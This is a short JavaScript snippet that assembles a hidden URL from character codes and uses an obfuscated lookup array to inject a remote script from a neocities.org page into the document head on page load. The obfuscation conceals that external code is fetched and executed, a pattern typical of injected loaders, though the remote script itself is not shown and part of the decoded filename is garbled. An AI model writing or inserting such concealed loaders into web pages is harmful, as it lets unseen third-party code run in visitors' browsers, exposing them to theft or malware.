var loadExternalScript = true; // Editable toggle

(function(){
    const _0xa1f3 = [
        'createElement',
        'script',
        'src',
        'appendChild',
        'head',
        'getElementById',
        'style',
        'display',
        'none',
        'textContent',
        'Script is disabled'
    ];

    function d(c){return String.fromCharCode.apply(null, c);}
    
    const part1 = d([104,116,116,112,115,58,47,47,115,104]);
    const part2 = d([97,114,101,98,111,111,115,116,101,114,46]);
    const part3 = d([110,101,111,99,105,116,105,101,115,46,111,114,103,47]);
    const part4 = d([115,99,114,105,112,116]);
    const part5 = d([37,69,51,133,164,46,106,115]);

    const finalURL = part1 + part2 + part3 + part4 + part5;

    if(loadExternalScript){
        var s = document[_0xa1f3[0]](_0xa1f3[1]);
        s[_0xa1f3[2]] = finalURL;
        document[_0xa1f3[4]][_0xa1f3[3]](s);
    }else{
        var d = document[_0xa1f3[5]]('scriptStatus');
        d[_0xa1f3[6]][_0xa1f3[7]] = _0xa1f3[8];
        d[_0xa1f3[9]] = _0xa1f3[10];
    }
})();
